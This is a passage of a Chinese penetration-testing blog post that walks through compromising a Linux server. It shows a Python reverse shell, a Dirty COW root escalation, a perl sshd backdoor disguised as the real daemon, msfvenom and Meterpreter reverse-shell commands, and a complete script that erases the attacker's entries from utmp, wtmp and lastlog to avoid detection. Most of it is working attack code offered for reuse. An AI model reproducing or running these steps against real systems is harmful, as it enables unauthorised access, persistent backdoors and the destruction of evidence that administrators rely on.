+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;x.x.x.x&#34;</span><span class="p">,</span><span class="mi">7777</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-i&#34;</span><span class="p">]);</span>
+</span></span></code></pre></div><p>监听一波
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/12.png" alt="">
+反弹成功了
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/13.png" alt=""></p>
+<p>执行<code>uname -a</code>看了下版本</p>
+<p>Linux cloud 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>2.6的版本上脏牛必中，可以不用在目标机子上面编译，在自己的Linux环境编译然后上传到目标机子上面执行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/14.png" alt=""></p>
+<p>那就静静等待脏牛把root替换掉，然后脸上目标机子，大概要几分钟这样子，去连ssh的时候有些管理员会把ssh的端口改了，用命令<code>netstat -nlp</code>就可以看到了。</p>
+<p>已经成功了，用户名为<code>firefart</code>密码是刚设置的123456。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/15.png" alt=""></p>
+<p>已经成功登陆目标机子
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/16.png" alt=""></p>
+<h1 id="0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</h1>
+<p>登陆目标机子后，记得及时恢复/etc/passwd</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cp /tmp/passwd.bak /etc/passwd
+</span></span></code></pre></div><p>看过一篇文章，觉得这个后门也不错，https://www.freebuf.com/articles/system/140880.html</p>
+<p>那些pam补丁、隐藏文件、suid、inetd等都可以用作后门，看你环境。</p>
+<ol>
+<li>这个ssh 后门伪装成一个perl脚本，名为sshd，位于/usr/sbin/sshd , 将系统原先的sshd 移到/usr/bin下</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="s2">&#34;/bin/sh&#34;</span><span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="n">STDIN</span><span class="p">)</span><span class="o">=~/^..</span><span class="n">zf</span><span class="o">/</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="p">}</span><span class="s2">&#34;/usr/sbin/sshd&#34;</span><span class="p">,</span><span class="nd">@ARGV</span><span class="p">;</span>
+</span></span></code></pre></div><ol start="2">
+<li>将真正的sshd 移至/usr/bin/sshd</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mv /usr/sbin/sshd /usr/bin/sshd
+</span></span></code></pre></div><ol start="3">
+<li>将后门sshd (perl脚本移动至/usr/sbin/sshd),并授予执行权限</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x /usr/sbin/sshd 
+</span></span></code></pre></div><ol start="4">
+<li>重启 ssh 服务</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/init.d/sshd restart
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/17.png" alt="">
+5.连接后门，记得安装好socat</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum install socat
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#socat STDIO TCP4:目标ip:ssh端口一般是22,sourceport=31334
+</span></span><span class="line"><span class="cl">socat STDIO TCP4:127.0.0.1:22,sourceport=31334
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/18.png" alt=""></p>
+<h1 id="0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</h1>
+<p>当然做内网渗透必不可少的就是msf了，如果是Windows的话推荐使用<code>CobaltStrike</code>非常nice的一个工具。</p>
+<p>反正我们现在拿到root的shell了，先反弹一个Meterpreter的会话，还是常规的生成payload，然后监听等待上线</p>
+<ol>
+<li>先生成一个后门</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.79.132 LPORT=4455 -f elf &gt; shell.elf
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/19.png" alt="">
+2. 把shell.elf上传到目标机子上面运行
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/20.png" alt=""></p>
+<ol start="3">
+<li>在本地执行监听</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl">set PAYLOAD linux/x86/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">set LHOST 0.0.0.0
+</span></span><span class="line"><span class="cl">set LPORT 4455
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/21.png" alt=""></p>
+<ol start="4">
+<li>执行后门反弹Meterpreter的会话</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x ./shell.elf
+</span></span><span class="line"><span class="cl">./shell.elf
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/22.png" alt="">
+5.查看跳板机处于哪几个网段</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run get_local_subnets
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/23.png" alt=""></p>
+<p>看了一下。。。</p>
+<p>但是我这个是属于外网的机子，后来想了一下感觉都不是内网一点意思都没有。。。</p>
+<p>算了吧下次有遇到内网的可以再写一篇内网渗透的文章出来哈</p>
+<h1 id="0x09-擦屁股">0x09 擦屁股</h1>
+<p>走之后记得清理痕迹，以防被溯源或者被管理员发现了。下面附上一个脚本供大家使用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python </span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwd</span> <span class="kn">import</span> <span class="n">getpwnam</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">strptime</span><span class="p">,</span> <span class="n">mktime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">UTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/run/utmp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">WTMPFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/wtmp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LASTLOGFILE</span> <span class="o">=</span> <span class="s2">&#34;/var/log/lastlog&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">LAST_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;I32s256s&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LAST_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">XTMP_STRUCT</span> <span class="o">=</span> <span class="s1">&#39;hi32s4s32s256shhiii4i20x&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">XTMP_STRUCT_SIZE</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">calcsize</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getXtmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xtmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">bytes</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">XTMP_STRUCT_SIZE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">XTMP_STRUCT</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">record</span> <span class="o">=</span> <span class="p">[(</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">])(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">record</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">record</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">hostname</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="n">xtmp</span> <span class="o">+=</span> <span class="nb">bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">xtmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">modifyLast</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">strtime</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">getpwnam</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;No such user.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">str2time</span> <span class="o">=</span> <span class="n">strptime</span><span class="p">(</span><span class="n">strtime</span><span class="p">,</span> <span class="s1">&#39;%Y:%m:</span><span class="si">%d</span><span class="s1">:%H:%M:%S&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">mktime</span><span class="p">(</span><span class="n">str2time</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Time format err.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">LAST_STRUCT</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">ttyname</span><span class="p">,</span> <span class="n">hostname</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">LAST_STRUCT_SIZE</span> <span class="o">*</span> <span class="n">p</span><span class="o">.</span><span class="n">pw_uid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;Cannot open file: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">showMessage</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">msg</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">saveFile</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w+b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">showMessage</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">usage</span> <span class="o">=</span> <span class="s1">&#39;usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188</span><span class="se">\n</span><span class="s1"> </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="n">usage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-m&#39;</span><span class="p">,</span> <span class="s1">&#39;--mode&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;MODE&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="s1">&#39;--ttyname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;TTYNAME&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--filename&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;FILENAME&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;USERNAME&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--hostname&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;HOSTNAME&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--dateline&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;DATELINE&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">UTMPFILE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># tamper</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">WTMPFILE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># tamper</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newData</span> <span class="o">=</span> <span class="n">getXtmp</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">saveFile</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">newData</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">options</span><span class="o">.</span><span class="n">MODE</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="o">==</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">showMessage</span><span class="p">(</span><span class="s1">&#39;+[Warning]: Incorrect parameter.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span> <span class="o">=</span> <span class="n">LASTLOGFILE</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># tamper</span>
+</span></span><span class="line"><span class="cl">            <span class="n">modifyLast</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">FILENAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">USERNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">TTYNAME</span> <span class="p">,</span> <span class="n">options</span><span class="o">.</span><span class="n">DATELINE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+</span></span></code></pre></div><h1 id="0x10-结束">0x10 结束</h1>
+<p>又2点了，抽支烟就该洗洗睡了，晚安~</p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/a-difficult-penetration-process.html">https://xxe.icu/a-difficult-penetration-process.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">
+                    #渗透测试
+                </a>
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E6%8F%90%E6%9D%83.html">
+                    #提权
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
